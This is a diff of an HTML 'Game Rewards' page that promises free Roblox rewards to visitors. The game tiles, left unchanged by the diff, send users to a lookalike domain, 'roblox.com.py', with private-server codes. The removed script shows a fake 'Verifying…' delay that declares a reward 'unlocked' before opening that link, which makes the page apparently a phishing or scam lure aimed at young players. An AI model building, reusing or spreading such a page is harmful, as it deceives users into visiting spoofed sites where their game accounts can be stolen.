@@ -5,17 +5,14 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Game Rewards</title>
 <link rel="stylesheet" href="style.css">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 <link rel="manifest" href="manifest.json">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 </head>
 <body>
 
 <audio id="bgMusic" loop>
   <source src="music/christmas.mp3" type="audio/mpeg">
 </audio>
-
-<a href="/admin/login.html" class="admin-login">Admin Login</a>
 
 <div class="theme-switch">
   <button onclick="setTheme('light')">Light</button>
@@ -24,15 +21,17 @@
 </div>
 
 <div class="social-box">
-  <a href="https://www.youtube.com/@suscribete_dalelike938" target="_blank" onclick="trackSocial('youtube')"><i class="fa-brands fa-youtube"></i></a>
-  <a href="https://discord.gg/JSDhjEYx" target="_blank" onclick="trackSocial('discord')"><i class="fa-brands fa-discord"></i></a>
-  <a href="https://www.instagram.com/iivan.0007/" target="_blank" onclick="trackSocial('instagram')"><i class="fa-brands fa-instagram"></i></a>
+  <a href="https://www.youtube.com/@suscribete_dalelike938" target="_blank"><i class="fa-brands fa-youtube"></i></a>
+  <a href="https://discord.gg/JSDhjEYx" target="_blank"><i class="fa-brands fa-discord"></i></a>
+  <a href="https://www.instagram.com/iivan.0007/" target="_blank"><i class="fa-brands fa-instagram"></i></a>
 </div>
 
 <img class="santa-hat" src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Santa_hat.svg/512px-Santa_hat.svg.png" alt="Santa Hat">
 
+<a href="admin/login.html" class="admin-login">Admin Login</a>
+
 <div class="main-card">
-  <h1>Click here for rewards free in games Roblox</h1>
+  <h1>Click a game to unlock rewards</h1>
 
   <div class="game" onclick="startVerify(this,'https://roblox.com.py/games/8737899170/Pet-Simulator-99?privateServerLinkCode=21350960716657913529484159794774')">
     <img src="https://tr.rbxcdn.com/180DAY-7ba01bc168c1d1f4fb06be2f1f2910d1/512/512/Image/Webp/noFilter">
@@ -63,82 +62,14 @@
     <span>MURDER MYSTERY 2</span>
     <div class="status"></div>
   </div>
+
 </div>
 
-<div id="verify"><div class="box">Verifying…</div></div>
 <div id="muteBtn"><i class="fa-solid fa-volume-high"></i></div>
 
 <canvas id="snow"></canvas>
 <canvas id="gifts"></canvas>
 
 <script src="script.js"></script>
-<script>
-// SUPABASE CONFIG
-const SUPABASE_URL = "YOUR_SUPABASE_URL";
-const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
-const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-// TRACK VISIT
-async function trackVisit(){
-  await supabase.from('visits').insert([{timestamp: new Date()}]);
-}
-trackVisit();
-
-// TRACK SOCIAL
-async function trackSocial(platform){
-  await supabase.from('social_clicks').insert([{platform, timestamp: new Date()}]);
-}
-
-// TRACK GAME
-async function trackGame(game){
-  await supabase.from('game_clicks').insert([{game_name: game, timestamp: new Date()}]);
-}
-
-// VERIFY FUNCTION
-function startVerify(el, link){
-  if(el.classList.contains("done")) return;
-  document.getElementById("verify").style.display="flex";
-  setTimeout(()=>{
-    document.getElementById("verify").style.display="none";
-    el.classList.add("done");
-    el.querySelector(".status").innerHTML="Reward unlocked <i class='fa-solid fa-check'></i>";
-    trackGame(link);
-    window.open(link,"_blank");
-  },1200);
-}
-
-// THEME SWITCH
-function setTheme(t){document.body.className="theme-"+t;}
-
-// MUSIC
-const music = document.getElementById("bgMusic");
-music.volume = 0.75;
-music.play();
-const muteBtn = document.getElementById("muteBtn");
-muteBtn.addEventListener("click", ()=>{
-  music.muted = !music.muted;
-  muteBtn.innerHTML = music.muted
-    ? '<i class="fa-solid fa-volume-xmark"></i>'
-    : '<i class="fa-solid fa-volume-high"></i>';
-});
-
-// SNOW + GIFTS ANIMATION
-const snow=document.getElementById("snow"), gifts=document.getElementById("gifts"),
-sx=snow.getContext("2d"), gx=gifts.getContext("2d");
-let w,h;
-function resize(){w=snow.width=gifts.width=innerWidth; h=snow.height=gifts.height=innerHeight;}
-resize(); onresize=resize;
-const flakes=[...Array(70)].map(()=>({x:Math.random()*w,y:Math.random()*h,r:Math.random()*3+1,s:Math.random()+.5}));
-const colors=["#ffd700","#8a2be2","#ff0000","#00bfff","#00ff00","#ffffff"];
-const boxes=[...Array(25)].map(()=>({x:Math.random()*w,y:Math.random()*h,s:Math.random()+.4,c:colors[Math.floor(Math.random()*colors.length)]}));
-(function loop(){
-  sx.clearRect(0,0,w,h);
-  gx.clearRect(0,0,w,h);
-  flakes.forEach(f=>{sx.fillStyle="white"; sx.beginPath(); sx.arc(f.x,f.y,f.r,0,7); sx.fill(); f.y+=f.s; if(f.y>h) f.y=0;});
-  boxes.forEach(b=>{gx.fillStyle=b.c; gx.fillRect(b.x,b.y,14,14); gx.fillStyle="#fff"; gx.fillRect(b.x+6,b.y,2,14); gx.fillRect(b.x,b.y+6,14,2); b.y+=b.s; if(b.y>h) b.y=0;});
-  requestAnimationFrame(loop);
-})();
-</script>
-
 </body>
 </html>
